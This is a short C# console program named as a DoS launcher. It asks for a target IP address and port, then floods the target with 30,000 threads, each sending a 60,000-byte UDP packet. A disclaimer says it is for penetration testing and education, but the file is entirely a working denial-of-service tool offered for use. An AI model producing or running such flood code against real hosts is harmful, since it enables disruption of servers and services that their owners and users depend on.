using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace TRoTS_DoS_Launcher
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("Copyright Jeremy Blevins LTD 2017\r\n\r\nDisclaimer: I am not responsible for any illegal activities done using this tool. You are responsible for your own actions. By using this tool, you agree to this Term of Service as a user. If you do not agree to this Term of Service, you are legally required to exit this tool until they are agreed upon. Authorization for this tool is strictly for server penetration testing, and educational purposes only. \r\n\r\nPlease enter an IP address to launch the DoS attack on.");
            string IP = Console.ReadLine();

            Console.WriteLine("\r\nPlease enter the port you would like to attack on.");
            int port = int.Parse(Console.ReadLine());

            int conns = 0;
            int maxConns = 30000;
            while (conns < maxConns)
            {
                new Thread(new ThreadStart(() =>
                {
                    byte[] buffer = new byte[60000];
                    UdpClient client = new UdpClient();
                    client.Send(buffer, buffer.Length, IP, port);
                })).Start();
                conns++;
                Console.WriteLine("Attacking "+IP+ " on port "+port+" - Packets sent: "+conns);
            }

            Console.Write("Press any key to exit.");
            Console.ReadLine();
        }
    }
}
